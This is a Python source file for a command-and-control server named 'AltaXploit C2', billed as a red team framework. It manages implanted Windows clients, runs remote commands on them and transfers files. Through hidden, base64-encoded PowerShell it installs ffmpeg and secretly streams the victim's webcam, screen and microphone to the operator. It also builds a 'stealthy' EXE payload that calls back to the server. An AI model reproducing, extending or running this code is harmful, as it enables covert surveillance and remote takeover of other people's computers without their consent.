import socket
import ssl
import threading
import queue
import json
import os
import binascii
import re
import sys
import time
import subprocess
import signal
import base64
from pathlib import Path
import shutil

HOST = '0.0.0.0'
PORT = 443

clients = {}
clients_lock = threading.Lock()
script_processes = []  # Track running scripts
hwid_to_id = {}        # Persistent mapping: HWID -> client_id
client_id_counter = 0  # Global counter for new clients

# Global flags for interactive mode
in_interactive = False
pending_messages = []

# Terminal Colors
RED_BOLD = "\033[1;31m"
LIGHT_RED = "\033[0;91m"
RESET = "\033[0m"
BOLD = "\033[1m"
CYAN = "\033[0;96m"
GREEN = "\033[0;92m"
YELLOW = "\033[0;93m"
HELP_COLOR = "\033[1;92m"
BOLD_YELLOW = "\033[1;33m"
BOLD_GREEN = "\033[1;32m"
BOLD_RED = "\033[1;31m"
WHITE = "\033[0;97m"
BLUE = "\033[0;94m"
MAGENTA = "\033[0;95m"
PURPLE = "\033[0;35m"
ORANGE = "\033[0;33m"
DARK_RED = "\033[0;31m"
GOLD = "\033[0;33m"

DOWNLOAD_FOLDER = "Client-Data"
SCRIPT_FOLDER = "script"
os.makedirs(DOWNLOAD_FOLDER, exist_ok=True)
os.makedirs(SCRIPT_FOLDER, exist_ok=True)

# Global LHOST for RTMP streams
LHOST = "127.0.0.1"

active_streams = {
    "camera": False,
    "screen": False,
    "mic": False
}

def get_rtmp_url(stream_key):
    return f"rtmp://{LHOST}/live/{stream_key}"

def run_local_script(script_name):
    script_dir = os.path.abspath(SCRIPT_FOLDER)
    script_path = os.path.join(script_dir, script_name)
    if not os.path.exists(script_path):
        print(f"{BOLD_RED}[!] Script not found: {script_path}{RESET}")
        return False
    print(f"{BOLD_YELLOW}[*] Running: python3 {script_name} (in {SCRIPT_FOLDER}/){RESET}")
    try:
        proc = subprocess.Popen(
            ["python3", script_path],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            cwd=script_dir,
            preexec_fn=os.setsid if hasattr(os, 'setsid') else None
        )
        script_processes.append(proc)
        print(f"{BOLD_GREEN}[+] Script started: {script_name} (PID: {proc.pid}){RESET}")
        time.sleep(2)
        if proc.poll() is not None:
            stdout, stderr = proc.communicate()
            if stderr:
                print(f"{BOLD_RED}[!] Script error: {stderr.decode()[:200]}{RESET}")
            return False
        print(f"{BOLD_GREEN}[+] Script running successfully in {SCRIPT_FOLDER}/{RESET}")
        return True
    except Exception as e:
        print(f"{BOLD_RED}[!] Failed to run script: {e}{RESET}")
        return False

def kill_local_scripts():
    global script_processes
    for proc in script_processes:
        try:
            if proc.poll() is None:
                proc.terminate()
                time.sleep(0.5)
                if proc.poll() is None:
                    proc.kill()
                print(f"{BOLD_YELLOW}[*] Killed script PID: {proc.pid}{RESET}")
        except:
            pass
    script_processes = []
    try:
        subprocess.run(["pkill", "-f", "cam.py"], capture_output=True)
        subprocess.run(["pkill", "-f", "screen.py"], capture_output=True)
        subprocess.run(["pkill", "-f", "microphone.py"], capture_output=True)
    except:
        pass

def recvline(conn, timeout=10):
    conn.settimeout(timeout)
    buffer = bytearray()
    try:
        while True:
            chunk = conn.recv(8192)
            if not chunk:
                return None if not buffer else buffer.decode(errors='replace').rstrip('\r\n')
            buffer.extend(chunk)
            if b'\n' in buffer:
                line, _, remainder = buffer.partition(b'\n')
                return line.decode(errors='replace').rstrip('\r\n')
    except socket.timeout:
        return None
    except Exception:
        return None
    finally:
        conn.settimeout(None)

class ClientSession:
    def __init__(self, connstream, addr, client_id, info=None):
        self.connstream = connstream
        self.addr = addr
        self.id = client_id
        self.cmd_queue = queue.Queue()
        self.alive = True
        self.ip = addr[0]
        self.os = "Unknown"
        self.user_machine = "Unknown"
        self.hwid = "Unknown"
        self.info_received = False
        self.command_lock = threading.Lock()
        if info:
            self.ip = info.get('IP', self.addr[0])
            self.os = info.get('OS', "Unknown")
            self.user_machine = info.get('UserMachine', "Unknown")
            self.hwid = info.get('HWID', "Unknown")
            self.info_received = True
        self.thread = threading.Thread(target=self.session_handler, daemon=True)
        self.thread.start()

    def sendline(self, line):
        try:
            self.connstream.sendall((line + "\n").encode())
        except Exception:
            self.alive = False

    def recvline(self):
        return recvline(self.connstream)

    def check_ffmpeg(self):
        self.sendline('Get-Command ffmpeg -ErrorAction SilentlyContinue')
        found = False
        while True:
            line = self.recvline()
            if line is None or line == "__end__":
                break
            if line != "heartbeat" and "ffmpeg.exe" in line:
                found = True
                while True:
                    l = self.recvline()
                    if l is None or l == "__end__":
                        break
                break
        return found

    def session_handler(self):
        try:
            if not self.info_received:
                self.connstream.settimeout(10)
                raw_info = self.connstream.recv(8192).decode(errors='replace').strip()
                self.connstream.settimeout(None)
                if raw_info.startswith("INFO:"):
                    try:
                        info = json.loads(raw_info[5:])
                        self.ip = info.get('IP', self.addr[0])
                        self.os = info.get('OS', "Unknown")
                        self.user_machine = info.get('UserMachine', "Unknown")
                        self.hwid = info.get('HWID', "Unknown")
                        self.info_received = True
                    except Exception as e:
                        self.alive = False
                        self.connstream.close()
                        return
                else:
                    self.alive = False
                    self.connstream.close()
                    return

            if (self.os == "Unknown" and self.user_machine == "Unknown"):
                self.alive = False
                self.connstream.close()
                return

            # Connection message – suppress if interactive
            msg = f"\n{BOLD_GREEN}Client {self.id} - {self.user_machine} ({self.os}) connected{RESET}"
            if in_interactive:
                pending_messages.append(msg)
            else:
                print(msg)
                print_prompt()

            while self.alive:
                try:
                    cmd = self.cmd_queue.get(timeout=1)
                except queue.Empty:
                    continue

                if cmd.lower() in ['exit', 'quit']:
                    try: self.sendline("exit")
                    except: pass
                    self.alive = False
                    break

                if cmd.lower().startswith("download "):
                    self.handle_download(cmd)
                    continue

                if cmd.lower().startswith("upload "):
                    self.handle_upload(cmd)
                    continue

                # Install spyware
                if cmd.lower() == "install spyware":
                    with self.command_lock:
                        print(f"{BOLD_YELLOW}[*] Installing FFmpeg on client {self.id}...{RESET}")
                        print(f"{BOLD_GREEN}[i] This will take 5-10 minutes depending on victim internet speed, continue working...{RESET}")
                        print(f"{BLUE}[!] After installation, execute 'spy camera' or 'spy screen', or 'spy mic' to start surveillance make sure one stream at a time{RESET}")
                        
                        ffmpeg_script = """$script = '$ProgressPreference="SilentlyContinue";$ErrorActionPreference="Stop";$zip="$env:TEMP\\ffmpeg.zip";$dest="$env:USERPROFILE\\ffmpeg";try{curl.exe -L "https://www.gyan.dev/ffmpeg/builds/ffmpeg-release-essentials.zip" -o $zip | Out-Null;Expand-Archive $zip -DestinationPath $dest -Force;$ffmpegPath=(Get-ChildItem $dest -Recurse -Filter ffmpeg.exe | Select-Object -First 1).Directory.FullName;if($ffmpegPath){$userPath=[Environment]::GetEnvironmentVariable("Path","User");if($userPath -notlike "*$ffmpegPath*"){[Environment]::SetEnvironmentVariable("Path",($userPath.TrimEnd(";") + ";" + $ffmpegPath),"User")}Remove-Item $zip -Force -ErrorAction SilentlyContinue}}catch{}'; $encoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($script)); Start-Process powershell.exe -WindowStyle Hidden -ArgumentList "-NoProfile", "-ExecutionPolicy", "Bypass", "-EncodedCommand", $encoded"""
                        
                        self.sendline(ffmpeg_script)
                        print(f"{LIGHT_RED}AltaXploit[{self.id}]{RESET}> ", end='', flush=True)
                        
                        def collect_output():
                            while True:
                                line = self.recvline()
                                if line is None or line == "__end__":
                                    break
                                if line != "heartbeat" and line.strip():
                                    pass
                        threading.Thread(target=collect_output, daemon=True).start()
                        continue

                # Spy camera
                if cmd.lower() == "spy camera":
                    with self.command_lock:
                        if not self.check_ffmpeg():
                            print(f"{BOLD_RED}[!] FFmpeg not found on client {self.id}!{RESET}")
                            print(f"{BOLD_YELLOW}[*] Please run 'install spyware' first or wait for installation to complete.{RESET}")
                            print(f"{LIGHT_RED}AltaXploit[{self.id}]{RESET}> ", end='', flush=True)
                            continue

                        print(f"\n{BLUE}================================================={RESET}")
                        print(f"{BOLD_YELLOW}[*] Spy Camera initiated on client {self.id}{RESET}")
                        print(f"{BLUE}-------------------------------------------------{RESET}")
                        
                        kill_local_scripts()
                        
                        print(f"{BOLD_YELLOW}[*] Starting local RTMP server (cam.py)...{RESET}")
                        if not run_local_script("cam.py"):
                            print(f"{BOLD_RED}[!] Failed to start cam.py - check if Node.js is installed{RESET}")
                            print(f"{LIGHT_RED}AltaXploit[{self.id}]{RESET}> ", end='', flush=True)
                            continue
                        
                        print(f"{BOLD_YELLOW}[*] Sending camera stream command to client...{RESET}")
                        
                        rtmp_url = get_rtmp_url("stream")
                        camera_cmd = f"""$c=((ffmpeg -list_devices true -f dshow -i dummy 2>&1)|Select-String '"([^"]+)"\\s*\\(video\\)'|ForEach-Object{{$_.Matches.Groups[1].Value}}|Select-Object -First 1);if($c){{Start-Process ffmpeg -ArgumentList "-f dshow -rtbufsize 256M -i video=`"$c`" -vcodec libx264 -preset ultrafast -tune zerolatency -pix_fmt yuv420p -b:v 2500k -maxrate 3000k -bufsize 1500k -g 30 -keyint_min 30 -sc_threshold 0 -bf 0 -fflags nobuffer -flags low_delay -flush_packets 1 -f flv {rtmp_url}" -WindowStyle Hidden}}else{{Write-Host "No camera found"}}"""
                        
                        encoded = base64.b64encode(camera_cmd.encode('utf-16le')).decode()
                        self.sendline(f"powershell -EncodedCommand {encoded}")
                        
                        while True:
                            line = self.recvline()
                            if line is None or line == "__end__":
                                break
                            if line != "heartbeat" and line.strip():
                                if "No camera" in line:
                                    print(f"{BOLD_RED}{line}{RESET}")
                                else:
                                    print(f"{WHITE}{line}{RESET}")
                        
                        active_streams["camera"] = True
                        print(f"{BLUE}-------------------------------------------------{RESET}")
                        print(f"{BOLD_GREEN}[+] Camera stream fully active on client {self.id}{RESET}")
                        print(f"{BOLD_YELLOW}[*] Stream URL: {rtmp_url}{RESET}")
                        print(f"{BLUE}================================================={RESET}\n")
                        print(f"{LIGHT_RED}AltaXploit[{self.id}]{RESET}> ", end='', flush=True)
                        continue

                # Spy screen
                if cmd.lower() == "spy screen":
                    with self.command_lock:
                        if not self.check_ffmpeg():
                            print(f"{BOLD_RED}[!] FFmpeg not found on client {self.id}!{RESET}")
                            print(f"{BOLD_YELLOW}[*] Please run 'install spyware' first or wait for installation to complete.{RESET}")
                            print(f"{LIGHT_RED}AltaXploit[{self.id}]{RESET}> ", end='', flush=True)
                            continue

                        print(f"\n{BLUE}================================================={RESET}")
                        print(f"{BOLD_YELLOW}[*] Spy Screen initiated on client {self.id}{RESET}")
                        print(f"{BLUE}-------------------------------------------------{RESET}")
                        
                        kill_local_scripts()
                        
                        print(f"{BOLD_YELLOW}[*] Starting local RTMP server (screen.py)...{RESET}")
                        if not run_local_script("screen.py"):
                            print(f"{BOLD_RED}[!] Failed to start screen.py - check if Node.js is installed{RESET}")
                            print(f"{LIGHT_RED}AltaXploit[{self.id}]{RESET}> ", end='', flush=True)
                            continue
                        
                        print(f"{BOLD_YELLOW}[*] Sending screen capture command to client...{RESET}")
                        
                        rtmp_url = get_rtmp_url("screen")
                        screen_cmd = f'Start-Process ffmpeg -ArgumentList "-f gdigrab -framerate 15 -i desktop -vf scale=1280:720 -draw_mouse 1 -vcodec libx264 -preset ultrafast -tune zerolatency -b:v 1500k -maxrate 1500k -bufsize 3000k -pix_fmt yuv420p -threads 1 -fflags nobuffer -flags low_delay -flush_packets 1 -f flv {rtmp_url}" -WindowStyle Hidden'
                        
                        self.sendline(screen_cmd)
                        
                        while True:
                            line = self.recvline()
                            if line is None or line == "__end__":
                                break
                        
                        active_streams["screen"] = True
                        print(f"{BLUE}-------------------------------------------------{RESET}")
                        print(f"{BOLD_GREEN}[+] Screen capture fully active on client {self.id}{RESET}")
                        print(f"{BOLD_YELLOW}[*] Stream URL: {rtmp_url}{RESET}")
                        print(f"{BLUE}================================================={RESET}\n")
                        print(f"{LIGHT_RED}AltaXploit[{self.id}]{RESET}> ", end='', flush=True)
                        continue

                # Spy mic
                if cmd.lower() == "spy mic":
                    with self.command_lock:
                        if not self.check_ffmpeg():
                            print(f"{BOLD_RED}[!] FFmpeg not found on client {self.id}!{RESET}")
                            print(f"{BOLD_YELLOW}[*] Please run 'install spyware' first or wait for installation to complete.{RESET}")
                            print(f"{LIGHT_RED}AltaXploit[{self.id}]{RESET}> ", end='', flush=True)
                            continue

                        print(f"\n{BLUE}================================================={RESET}")
                        print(f"{BOLD_YELLOW}[*] Spy Mic initiated on client {self.id}{RESET}")
                        print(f"{BLUE}-------------------------------------------------{RESET}")
                        
                        kill_local_scripts()
                        
                        print(f"{BOLD_YELLOW}[*] Starting local RTMP server (microphone.py)...{RESET}")
                        if not run_local_script("microphone.py"):
                            print(f"{BOLD_RED}[!] Failed to start microphone.py - check if Node.js is installed{RESET}")
                            print(f"{LIGHT_RED}AltaXploit[{self.id}]{RESET}> ", end='', flush=True)
                            continue
                        
                        print(f"{BOLD_YELLOW}[*] Sending microphone stream command to client...{RESET}")
                        
                        rtmp_url = get_rtmp_url("mic")
                        mic_cmd = f"""$s='[Console]::OutputEncoding=[System.Text.Encoding]::UTF8;$m=(& ffmpeg -list_devices true -f dshow -i dummy 2>&1|Out-String|Select-String ''"([^"]+)"\\s*\\(audio\\)''|ForEach-Object{{$_.Matches.Groups[1].Value}})|Where-Object{{$_ -notmatch "Stereo Mix|Virtual|CABLE|Voicemeeter|Bluetooth"}}|Select-Object -First 1;if(!$m){{$m=(& ffmpeg -list_devices true -f dshow -i dummy 2>&1|Out-String|Select-String ''"([^"]+)"\\s*\\(audio\\)''|ForEach-Object{{$_.Matches.Groups[1].Value}})|Select-Object -First 1}};if($m){{ffmpeg -f dshow -i "audio=$m" -ac 2 -ar 44100 -acodec aac -b:a 128k -f flv {rtmp_url}}}';(New-Object -ComObject WScript.Shell).Run("powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand $([Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($s)))",0,$false)"""
                        
                        encoded = base64.b64encode(mic_cmd.encode('utf-16le')).decode()
                        self.sendline(f"powershell -EncodedCommand {encoded}")
                        
                        while True:
                            line = self.recvline()
                            if line is None or line == "__end__":
                                break
                            if line != "heartbeat" and line.strip():
                                if "No microphone" in line:
                                    print(f"{BOLD_RED}{line}{RESET}")
                                else:
                                    print(f"{WHITE}{line}{RESET}")
                        
                        active_streams["mic"] = True
                        print(f"{BLUE}-------------------------------------------------{RESET}")
                        print(f"{BOLD_GREEN}[+] Microphone stream fully active on client {self.id}{RESET}")
                        print(f"{BOLD_YELLOW}[*] Stream URL: {rtmp_url}{RESET}")
                        print(f"{BLUE}================================================={RESET}\n")
                        print(f"{LIGHT_RED}AltaXploit[{self.id}]{RESET}> ", end='', flush=True)
                        continue

                # Spy stop
                if cmd.lower() == "spy stop":
                    with self.command_lock:
                        active_list = []
                        if active_streams["camera"]:
                            active_list.append("Camera")
                        if active_streams["screen"]:
                            active_list.append("Screen")
                        if active_streams["mic"]:
                            active_list.append("Microphone")
                        
                        if not active_list:
                            print(f"{YELLOW}[i] No active spy streams to stop{RESET}")
                            print(f"{LIGHT_RED}AltaXploit[{self.id}]{RESET}> ", end='', flush=True)
                            continue
                        
                        print(f"{BOLD_YELLOW}[*] Stopping spy streams: {', '.join(active_list)} on client {self.id}...{RESET}")
                        print(f"{BOLD_YELLOW}[*] Stopping local scripts...{RESET}")
                        kill_local_scripts()
                        
                        self.sendline('Get-Process ffmpeg | Stop-Process -Force')
                        while True:
                            line = self.recvline()
                            if line is None or line == "__end__":
                                break
                        
                        active_streams["camera"] = False
                        active_streams["screen"] = False
                        active_streams["mic"] = False
                        
                        print(f"{BOLD_GREEN}[+] Stopped: {', '.join(active_list)} on client {self.id}{RESET}")
                        print(f"{LIGHT_RED}AltaXploit[{self.id}]{RESET}> ", end='', flush=True)
                        continue

                # Normal commands
                with self.command_lock:
                    self.sendline(cmd)
                    output_lines = []
                    while True:
                        line = self.recvline()
                        if line is None or line == "__end__":
                            break
                        if line != "heartbeat" and line.strip():
                            output_lines.append(line)
                    
                    if output_lines:
                        for line in output_lines:
                            if line.startswith("ERROR:"):
                                print(f"{BOLD_RED}{line}{RESET}")
                            elif line.startswith("[+]") or line.startswith("[i]"):
                                print(f"{GREEN}{line}{RESET}")
                            else:
                                print(f"{WHITE}{line}{RESET}")
                    
                    print(f"{LIGHT_RED}AltaXploit[{self.id}]{RESET}> ", end='', flush=True)

        except Exception as e:
            pass
        finally:
            self.cleanup()

    def cleanup(self):
        self.alive = False
        try:
            self.connstream.shutdown(socket.SHUT_RDWR)
        except:
            pass
        self.connstream.close()
        with clients_lock:
            if self.id in clients:
                del clients[self.id]
        if self.info_received:
            msg = f"\n{BOLD_YELLOW}[*] Client {self.id} disconnected{RESET}"
            if in_interactive:
                pending_messages.append(msg)
            else:
                print(msg)

    def handle_download(self, cmd):
        remote_file = cmd[9:].strip()
        try:
            self.sendline(f"download {remote_file}")
            first_line = self.recvline()
            if first_line is None:
                print(f"{YELLOW}[!] No response from client{RESET}")
                return

            if first_line.startswith("ERROR:"):
                print(f"{YELLOW}[!] {first_line[6:]}{RESET}")
                while True:
                    line = self.recvline()
                    if line is None or line == "__end__":
                        break
                return

            print(f"{BOLD_YELLOW}Downloading '{remote_file}', please wait...{RESET}")
            hex_data = first_line
            while True:
                line = self.recvline()
                if line is None or line == "__end__":
                    break
                hex_data += line

            if hex_data:
                filename = re.split(r'[\\/]', remote_file)[-1]
                local_file = os.path.join(DOWNLOAD_FOLDER, filename)
                with open(local_file, "wb") as f:
                    f.write(binascii.unhexlify(hex_data))
                print(f"{BOLD_GREEN}Download successful: {local_file}{RESET}")
            else:
                print(f"{YELLOW}[!] Empty file received{RESET}")

        except Exception as e:
            print(f"{BOLD_RED}[!] Download error: {e}{RESET}")
        finally:
            print(f"{LIGHT_RED}AltaXploit[{self.id}]{RESET}> ", end='', flush=True)

    def handle_upload(self, cmd):
        parts = cmd.split(maxsplit=2)
        if len(parts) != 3:
            print(f"{YELLOW}[!] Usage: upload <src> <dst>{RESET}")
            print(f"{LIGHT_RED}AltaXploit[{self.id}]{RESET}> ", end='', flush=True)
            return
        src, dst = parts[1], parts[2]
        if not os.path.isfile(src):
            print(f"{YELLOW}[!] File not found: {src}{RESET}")
            print(f"{LIGHT_RED}AltaXploit[{self.id}]{RESET}> ", end='', flush=True)
            return
        try:
            print(f"{BOLD_YELLOW}Uploading '{src}' to '{dst}', please wait...{RESET}")
            with open(src, "rb") as f:
                hex_data = binascii.hexlify(f.read()).decode()
            self.sendline(f"__upload__:{dst}")
            for i in range(0, len(hex_data), 4096):
                self.sendline(hex_data[i:i+4096])
            self.sendline("__end__")
            while True:
                line = self.recvline()
                if line == "__end__" or line is None:
                    break
                print(f"{CYAN}{line}{RESET}")
            print(f"{BOLD_GREEN}[+] Upload complete{RESET}")
        except Exception as e:
            print(f"{BOLD_RED}[!] Upload error: {e}{RESET}")
        print(f"{LIGHT_RED}AltaXploit[{self.id}]{RESET}> ", end='', flush=True)

def accept_clients(bindsocket, context):
    global client_id_counter
    while True:
        try:
            newsocket, fromaddr = bindsocket.accept()
            connstream = context.wrap_socket(newsocket, server_side=True)
            connstream.settimeout(5)
            try:
                raw = connstream.recv(8192).decode(errors='replace').strip()
            except socket.timeout:
                connstream.close()
                continue
            finally:
                connstream.settimeout(None)
            if not raw.startswith("INFO:"):
                connstream.close()
                continue
            try:
                info = json.loads(raw[5:])
                hwid = info.get('HWID')
                if not hwid:
                    connstream.close()
                    continue
            except:
                connstream.close()
                continue

            with clients_lock:
                if hwid in hwid_to_id:
                    client_id = hwid_to_id[hwid]
                    if client_id in clients:
                        old_client = clients[client_id]
                        old_client.alive = False
                        try:
                            old_client.connstream.close()
                        except:
                            pass
                        del clients[client_id]
                else:
                    client_id_counter += 1
                    client_id = client_id_counter
                    hwid_to_id[hwid] = client_id
                clients[client_id] = ClientSession(connstream, fromaddr, client_id, info=info)
        except ssl.SSLError as e:
            pass
        except Exception as e:
            msg = f"{BOLD_RED}[!] Listener error: {e}{RESET}"
            if in_interactive:
                pending_messages.append(msg)
            else:
                print(msg)
                print_prompt()

def print_prompt():
    print(f"{RED_BOLD}AltaXploit>{RESET} ", end='', flush=True)

def flush_pending_messages():
    global pending_messages
    if pending_messages:
        for msg in pending_messages:
            print(msg)
        pending_messages = []

def print_client_list():
    with clients_lock:
        active = {cid: c for cid, c in clients.items() if c.alive}
        if not active:
            print(f"{BOLD_YELLOW}[*] No connected clients.{RESET}")
            return
        print(f"{BOLD}Client ID  IP Address       OS                               User@Machine{RESET}")
        print("." * 90)
        for cid, c in sorted(active.items()):
            print(f"{BOLD}{cid:<10}{RESET} {CYAN}{c.ip:<15}{RESET} {GREEN}{c.os:<35}{RESET} {YELLOW}{c.user_machine:<30}{RESET}")
        print("." * 90)

def show_help():
    print(f"""
{HELP_COLOR}================================================={RESET}
  {BOLD}{CYAN}AltaXploit C2 - Command Reference{RESET}
{HELP_COLOR}================================================={RESET}

  {BOLD}{GREEN}CLIENT MANAGEMENT{RESET}
  {GREEN} {RESET}  {YELLOW}list{RESET}                        - {WHITE}Show connected clients{RESET}
  {GREEN} {RESET}  {YELLOW}attack <id>{RESET}                 - {WHITE}Interact with client{RESET}
  {GREEN} {RESET}  {YELLOW}back{RESET}                        - {WHITE}Return to main prompt{RESET}
  {GREEN} {RESET}  {YELLOW}kill <id>{RESET}                   - {WHITE}Permanently kill a client session (Stop-Process){RESET}

  {BOLD}{BLUE}FILE OPERATIONS{RESET}
  {BLUE} {RESET}  {YELLOW}upload <src> <dst>{RESET}           - {WHITE}Upload file to client{RESET}
  {BLUE} {RESET}  {YELLOW}download <clientfile>{RESET}        - {WHITE}Download file from client{RESET}

  {BOLD}{MAGENTA}SURVEILLANCE COMMANDS{RESET}
  {MAGENTA} {RESET}  {YELLOW}install spyware{RESET}           - {WHITE}Install FFmpeg (5-10 mins){RESET}
  {MAGENTA} {RESET}  {YELLOW}spy camera{RESET}                - {WHITE}Start camera stream{RESET}
  {MAGENTA} {RESET}  {YELLOW}spy screen{RESET}                - {WHITE}Start screen capture{RESET}
  {MAGENTA} {RESET}  {YELLOW}spy mic{RESET}                   - {WHITE}Start microphone stream{RESET}
  {MAGENTA} {RESET}  {YELLOW}spy stop{RESET}                  - {WHITE}Stop active spy streams{RESET}

  {BOLD}{ORANGE}PAYLOAD GENERATION{RESET}
  {ORANGE} {RESET}  {YELLOW}generate payload{RESET}           - {WHITE}Create a new Windows EXE payload will take (2-3 min){RESET}

  {BOLD}{RED_BOLD}SYSTEM{RESET}
  {RED_BOLD} {RESET}  {YELLOW}clear{RESET}                    - {WHITE}Clear screen{RESET}
  {RED_BOLD} {RESET}  {YELLOW}exit{RESET}                     - {WHITE}Shut down server{RESET}
  {MAGENTA} {RESET}  {YELLOW}help{RESET}                      - {WHITE}Show this help menu{RESET}


{HELP_COLOR}================================================={RESET}
""")

def graceful_shutdown(message="[*] Better 'exit' next time. Shutting down gracefully..."):
    print(f"\n{BOLD_YELLOW}{message}{RESET}")
    kill_local_scripts()
    with clients_lock:
        for c in clients.values():
            c.cmd_queue.put("exit")
    sys.exit(0)

def print_banner():
    banner = f"""
{RED_BOLD}    █████╗ ██╗  ████████╗ █████╗ ██╗  ██╗██████╗ ██╗      ██████╗ ██╗████████╗
{RED_BOLD}   ██╔══██╗██║  ╚══██╔══╝██╔══██╗╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝
{RED_BOLD}   ███████║██║     ██║   ███████║ ╚███╔╝ ██████╔╝██║     ██║   ██║██║   ██║   
{RED_BOLD}   ██╔══██║██║     ██║   ██╔══██║ ██╔██╗ ██╔═══╝ ██║     ██║   ██║██║   ██║   
{RED_BOLD}   ██║  ██║███████╗██║   ██║  ██║██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║   
{RED_BOLD}   ╚═╝  ╚═╝╚══════╝╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   
                                                                                         
{RED_BOLD}    ════════════════════════════════════════════════════════════════════════
{RED_BOLD}    {BOLD}{WHITE}AltaXploit C2 Framework{RESET}{RED_BOLD} - {YELLOW}Advanced Red Team Command & Control{RESET}{RED_BOLD}
{RED_BOLD}    ════════════════════════════════════════════════════════════════════════
{RED_BOLD}    {WHITE}Developer: {GOLD}Muhammad Alwaz{RESET}{RED_BOLD}
{RED_BOLD}    {WHITE}GitHub:    {BLUE}https://github.com/AltaXploit{RESET}{RED_BOLD}
{RED_BOLD}    {WHITE}Website:   {BLUE}https://www.alwaz.co.uk{RESET}{RED_BOLD}
{RED_BOLD}    ════════════════════════════════════════════════════════════════════════
{RED_BOLD}    {YELLOW}🛡️  "With great power comes great responsibility!"{RESET}{RED_BOLD}
{RED_BOLD}    ════════════════════════════════════════════════════════════════════════{RESET}
"""
    print(banner)

def get_lhost():
    global LHOST
    print(f"\n{BOLD_YELLOW}[?] Enter LHOST IP address for C2 server:{RESET}")
    print(f"{WHITE}   (This is your IP where clients will connect){RESET}")
    while True:
        try:
            lhost_input = input(f"{BOLD_GREEN}LHOST > {RESET}").strip()
            if lhost_input:
                if re.match(r'^(\d{1,3}\.){3}\d{1,3}$', lhost_input):
                    LHOST = lhost_input
                    print(f"{BOLD_GREEN}[+] LHOST set to: {LHOST}{RESET}\n")
                    return LHOST
                else:
                    print(f"{BOLD_RED}[!] Invalid IP format. Please enter a valid IP address.{RESET}")
            else:
                print(f"{BOLD_YELLOW}[!] LHOST cannot be empty. Please enter an IP address.{RESET}")
        except KeyboardInterrupt:
            print(f"\n{BOLD_YELLOW}[!] Using default LHOST: {LHOST}{RESET}\n")
            return LHOST

def generate_payload():
    """Interactive payload generator with AltaXploit theming"""
    print(f"\n{MAGENTA}═══════════════════════════════════════════════════════════════{RESET}")
    print(f"{BOLD}{WHITE}         AltaXploit Payload Generator – Windows EXE{RESET}")
    print(f"{MAGENTA}═══════════════════════════════════════════════════════════════{RESET}\n")
    
    print(f"{BLUE}[*] This will create a stealthy Windows EXE that runs your PowerShell payload.{RESET}")
    print(f"{BLUE}[*] The EXE uses native Windows API (CreateProcess) with no console flash.{RESET}\n")
    
    out_name = input(f"{BOLD_GREEN}📁 Output EXE name (e.g., payload.exe): {RESET}").strip()
    if not out_name.endswith('.exe'):
        out_name += '.exe'
    
    ip = input(f"{BOLD_GREEN}🌐 C2 IP address: {RESET}").strip()
    if not ip:
        print(f"{BOLD_RED}[!] IP is required.{RESET}")
        return
    
    port = input(f"{BOLD_GREEN}🔌 C2 Port (default 443): {RESET}").strip()
    if not port:
        port = '443'
    
    print(f"\n{YELLOW}[*] Generating payload for IP {ip}:{port} -> {out_name}{RESET}")
    print(f"{YELLOW}[*] This may take a moment...{RESET}\n")
    
    base_dir = Path(__file__).parent
    encrypt_script = base_dir / "encrypt_template.py"
    if not encrypt_script.exists():
        print(f"{BOLD_RED}[!] encrypt_template.py not found in C2 directory!{RESET}")
        return

    try:
        result = subprocess.run(
            ["python3", str(encrypt_script), ip, port],
            capture_output=True,
            text=True,
            check=True
        )
        encrypted_b64 = result.stdout.strip()
        if not encrypted_b64:
            raise ValueError("Encryption produced empty output")
    except Exception as e:
        print(f"{BOLD_RED}[!] Encryption failed: {e}{RESET}")
        return

    build_dir = base_dir / "build"
    build_dir.mkdir(exist_ok=True)

    cs_template = base_dir / "Program.template.cs"
    csproj_template = base_dir / "Payload.csproj"
    if not cs_template.exists() or not csproj_template.exists():
        print(f"{BOLD_RED}[!] Template files missing!{RESET}")
        return

    shutil.copy(cs_template, build_dir / "Program.cs")
    shutil.copy(csproj_template, build_dir / "Payload.csproj")

    program_cs = build_dir / "Program.cs"
    content = program_cs.read_text()
    content = content.replace("__ENCRYPTED_BASE64__", encrypted_b64)
    program_cs.write_text(content)

    dotnet_check = subprocess.run(["dotnet", "--version"], capture_output=True, text=True)
    if dotnet_check.returncode != 0:
        print(f"{BOLD_RED}[!] .NET SDK not found. Please install dotnet-sdk-8.0.{RESET}")
        print(f"{YELLOW}Installation: sudo apt install dotnet-sdk-8.0{RESET}")
        return

    print(f"{YELLOW}[*] Compiling with dotnet... may take a moment.{RESET}")
    try:
        subprocess.run(["dotnet", "restore"], cwd=str(build_dir), check=True, capture_output=True)
        subprocess.run(
            ["dotnet", "publish", "-c", "Release", "-r", "win-x64", "--self-contained", "false", "-o", str(build_dir / "publish")],
            cwd=str(build_dir),
            check=True,
            capture_output=True
        )
    except subprocess.CalledProcessError as e:
        print(f"{BOLD_RED}[!] Compilation failed: {e.stderr}{RESET}")
        return

    exe_path = build_dir / "publish" / "Payload.exe"
    if not exe_path.exists():
        exe_files = list((build_dir / "publish").glob("*.exe"))
        if exe_files:
            exe_path = exe_files[0]
        else:
            print(f"{BOLD_RED}[!] EXE not found after compilation.{RESET}")
            return

    output_path = base_dir / out_name
    shutil.copy(exe_path, output_path)

    print(f"\n{GREEN}═══════════════════════════════════════════════════════════════{RESET}")
    print(f"{BOLD_GREEN}[+] Payload generated successfully!{RESET}")
    print(f"{BOLD_GREEN}[+] EXE saved as: {output_path}{RESET}")
    print(f"{YELLOW}[i] You can now run it on a target machine.{RESET}")
    print(f"{GREEN}═══════════════════════════════════════════════════════════════{RESET}\n")

def main():
    global LHOST, in_interactive, pending_messages
    get_lhost()
    
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain(certfile='certs/cert.pem', keyfile='certs/key.pem')

    bindsocket = socket.socket()
    bindsocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    bindsocket.bind((HOST, PORT))
    bindsocket.listen(5)
    
    print_banner()
    print(f"{BOLD_GREEN}[*] Listening on {HOST}:{PORT} (TLS){RESET}")
